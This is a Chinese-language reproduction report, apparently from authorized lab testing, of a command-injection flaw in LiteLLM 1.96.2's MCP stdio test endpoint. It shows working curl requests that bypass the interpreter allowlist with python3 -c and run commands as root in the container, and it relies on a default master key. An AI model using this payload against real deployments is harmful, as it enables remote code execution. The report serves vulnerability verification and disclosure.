# LiteLLM MCP stdio test 端点命令注入（CWE-78）复现情况

## 漏洞描述
LiteLLM（AI 网关代理）的 MCP 服务器测试端点 `POST /mcp-rest/test/connection`（及 `/mcp-rest/test/tools/list`）在 `transport: stdio` 模式下，会把请求体中的 `command` 与 `args` 作为子进程直接拉起执行。

LiteLLM 官方针对 CVE-2026-42271 / CVE-2026-30623 的修复是在 1.83.x 引入 stdio 命令白名单：
`['deno', 'docker', 'node', 'npx', 'python', 'python3', 'uvx']`。
但该白名单本身可被绕过——`python3`、`node`、`npx`、`docker`、`uvx` 等解释器/工具均可执行任意代码
（如 `python3 -c "import os;os.system(...)"`），因此命令注入在 1.96.2 版本上仍然成立。

## 影响版本
- 目标实测版本：LiteLLM **1.96.2**（`/openapi.json` 的 `info.version`）。
- 关联公开漏洞：CVE-2026-42271（MCP test 端点命令注入，官方修复 1.83.7）、CVE-2026-30623（MCP stdio 命令注入）。同一 sink 类。

## 漏洞类型
命令注入（CWE-78）→ 远程代码执行（RCE）

## 利用前提
- **认证边界**：post-auth（需有效 proxy API key）。
- 目标部署保留了 LiteLLM **默认 master key**，该 key 有效且为 admin 权限，
  可直接通过认证。未尝试 / 未依赖 CVE-2026-48710（Starlette BadHost）未认证链。

## 目标信息
- 虚拟机：ubuntu-24.04.3-02（192.168.188.x），Ubuntu 24.04.3 LTS（kernel 6.8.0-136，OpenSSH 9.6p1）。
- 服务：LiteLLM 运行在 Docker 容器 `tmp_ll_litellm_1`（镜像 `docker.litellm.ai/berriai/litellm-database:latest`），
  容器内监听 `:4000`，宿主机 nginx 将 `:8000` 反代到 `:4000`。对外暴露 8000（LiteLLM API / Swagger UI）。

## 复现步骤

### 1. 指纹与认证探测
```
curl -s http://192.168.188.x:8000/openapi.json | python3 -c "import sys,json;print(json.load(sys.stdin)['info'])"
# -> LiteLLM API version 1.96.2

curl -s -o /dev/null -w '%{http_code}\n' http://192.168.188.x:8000/v1/models -H 'Authorization: Bearer <proxy-api-key>'
# -> 200  （默认 master key 有效）
```

### 2. 触发命令注入（真实网络攻击路径）
从攻击机直接 HTTP 触发，未登录目标机：
```
curl -s -X POST 'http://192.168.188.x:8000/mcp-rest/test/connection' \
  -H 'Authorization: Bearer <proxy-api-key>' \
  -H 'Content-Type: application/json' \
  -d '{"transport":"stdio","command":"python3","args":["-c","import os;os.system(\"id > /tmp/PWNED_2026.txt 2>&1; hostname >> /tmp/PWNED_2026.txt\")"]}'
# -> {"status":"error","error":true,"message":"Failed to connect to MCP server. Check proxy logs for details."}
```
说明：端点按 MCP 协议与子进程握手，`python3 -c` 执行完即退出导致握手失败返回 error，
但 `os.system(...)` 已在子进程中执行（副作用已发生）。

### 3. 验证命令执行结果（SSH 辅助，仅验证）
```
sudo docker exec tmp_ll_litellm_1 sh -c 'cat /tmp/PWNED_2026.txt'
# -> uid=0(root) gid=0(root) groups=0(root),...
# -> f7a355ad9b87   (容器ID)
```

## 证据
- 触发请求（如上 curl）。
- 写入容器的 `/tmp/PWNED_2026.txt` 内容：
  ```
  uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
  f7a355ad9b87
  ```
- 该文件属主 root，证明命令以容器内 **root** 身份执行。

## 复现结果
**成功**（命令注入 → RCE，以 root 在 LiteLLM 容器内执行任意命令）

## 复现方式分层
- **真实网络攻击路径**：从攻击机直接 HTTP POST 到 `192.168.188.x:8000`（nginx → LiteLLM 容器），未 SSH 进目标机。
- 认证边界：**post-auth**（使用目标上保留的默认 master key；具体值见本地台账）。

## 命令执行权限
- **root**（LiteLLM 容器 `tmp_ll_litellm_1` 内 `uid=0(root)`）。

## 置信度
**high**（动态复现，命令输出已实际回读确认）

## 清理记录
复现写入容器的临时标记文件均已删除（`/tmp/PWNED_2026.txt`、`/tmp/litellm_pwn_id.txt`、
`/tmp/litellm_pwn_marker.txt`、`/tmp/LITELLM_PWN_MARKER_2026`）。未修改目标任何配置/账号。
